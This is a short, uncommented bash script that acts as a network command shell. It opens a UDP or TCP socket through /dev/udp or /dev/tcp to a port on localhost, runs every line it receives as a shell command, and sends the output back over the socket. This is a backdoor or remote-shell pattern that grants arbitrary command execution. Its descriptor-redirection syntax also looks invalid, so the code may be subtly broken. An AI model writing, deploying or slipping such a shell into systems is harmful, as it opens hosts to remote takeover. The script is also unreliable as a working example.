#!/bin/bash
proto="${1-udp}";port="${2-8080}";fd="${3-9}";[ -n "$*" ]&&{ "$fd"<>/dev/"$proto"/localhost/"$port";[ $? -eq 1 ]&&exit;echo "connection established">&"$fd";while : ; do a=$(dd bs=200 count=1<&"$fd" 2>/dev/null);if echo "$a"|grep "exit";then break;fi;echo "$($a)">&"$fd";done;"$fd">&-;exec "$fd"<&-; }
